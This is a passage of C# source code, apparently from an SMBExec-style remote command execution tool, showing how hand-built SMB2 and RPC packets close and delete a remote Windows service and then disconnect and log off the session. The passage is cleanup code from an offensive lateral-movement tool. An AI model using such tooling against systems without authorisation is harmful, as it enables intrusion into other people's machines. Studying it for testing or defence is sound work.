                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "CloseServiceHandle";
                                        SMB_Close_Service_Handle_Stage = 1;
                                    }
                                    break;

                                case "CloseServiceHandle":
                                    {
                                        if (SMB_Close_Service_Handle_Stage == 1)
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                            Service_Deleted = true;
                                            SMB2_Message_ID += 20;
                                            SMB_Close_Service_Handle_Stage++;
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Context_Handle);
                                        }
                                        else
                                        {
                                            SMB2_Message_ID++;
                                            SMBClientStage = "CloseRequest";
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Manager_Context_Handle);
                                        }
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);

                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x06, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;

                                case "TreeDisconnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x04, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2TreeDisconnectRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x02, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2SessionLogoffRequest();
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();

                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = Utilities.SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }
                        }
                    }
                    if (!Service_Deleted && !AdminCheck)
                    {
                        output.AppendLine("Warning: Service not deleted. Please delete Service \"" + SMB_Service + "\" manually.");
                    }
                }
                SMBClient.Close();
                SMBClientStream.Close();
            }

            return output.ToString();
        }
        private static byte[] GetNetBIOSSessionService(int SMB_Header_Length, int RPC_Data_Length)
        {
            OrderedDictionary Packet_NetBIOS_Session_Service = SMBExec.NetBIOSSessionService(SMB_Header_Length, RPC_Data_Length);
            byte[] NetBIOS_Session_Service = Utilities.ConvertFromPacketOrderedDictionary(Packet_NetBIOS_Session_Service);
            return NetBIOS_Session_Service;

        }
    }
}

